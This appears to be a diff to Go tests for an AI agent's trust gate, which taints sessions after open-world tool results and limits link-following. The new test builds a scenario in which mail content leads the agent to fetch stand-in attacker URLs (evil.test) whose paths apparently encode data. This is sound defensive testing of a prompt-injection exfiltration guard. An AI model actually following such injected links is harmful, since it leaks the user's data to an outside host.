@@ -84,7 +84,7 @@ func TestTheFirstTaintIsKeptOnTheSession(t *testing.T) {
 	em := &emitter{store: st, hub: newHub(), logger: slog.Default(), runID: "r1"}
 	g := newGate(map[string]bool{}, st, em, "r1", time.Now)
 	g.session = session.ID
-	g.seed([]nacelle.Message{nacelle.UserText("what is on my board")})
+	g.seed([]nacelle.Message{nacelle.UserText("what is on my board")}, false)
 	g.addSources(openWorldSources([]nacelle.Tool{specTool{nacelle.Spec{Name: "toile_peek", ReadOnly: true, Hints: &nacelle.Hints{OpenWorld: true}}}}))
 	g.observe(ctx, nacelle.HookEvent{Point: nacelle.AfterToolCall, Call: nacelle.Call{Name: "memory_search"}})
 	if got, _ := st.GetSession(ctx, 1, session.ID); got.Tainted {
@@ -198,6 +198,18 @@ func TestTheLinkBudgetCarriesAcrossOwnerMessages(t *testing.T) {
 		nacelle.UserText("thanks, go on"))
 	if g.need(sonarFetchTool, urlInput("https://evil.test/3/7"), true) != askNo || g.need(sonarFetchTool, urlInput("https://evil.test/4/6"), true) != askLinks {
 		t.Fatal("two links followed in an earlier run must leave one of the budget, the owner's link none")
+	}
+	routedFetch := func(id, url string) nacelle.Message {
+		input := json.RawMessage(`{"name":"` + sonarFetchTool + `","arguments":` + string(urlInput(url)) + `}`)
+		return nacelle.Message{Role: nacelle.RoleAssistant, Parts: []nacelle.Part{nacelle.ToolCall{ID: id, Name: callTool, Input: input}}}
+	}
+	g = trustGate(nacelle.UserText("read my mail"),
+		nacelle.Message{Role: nacelle.RoleAssistant, Parts: []nacelle.Part{nacelle.ToolCall{ID: "m1", Name: "courrier_read_thread", Input: json.RawMessage(`{}`)}}},
+		nacelle.Message{Role: nacelle.RoleUser, Parts: []nacelle.Part{nacelle.ToolResult{ID: "m1", Name: "courrier_read_thread", Result: linkTable()}}},
+		routedFetch("f1", "https://evil.test/1/F"), routedFetch("f2", "https://evil.test/2/R"), routedFetch("f3", "https://evil.test/3/7"),
+		nacelle.UserText("thanks, go on"))
+	if g.need(sonarFetchTool, urlInput("https://evil.test/4/6"), true) != askLinks {
+		t.Fatal("links followed through call_tool in an earlier run must spend the budget too")
 	}
 }
 
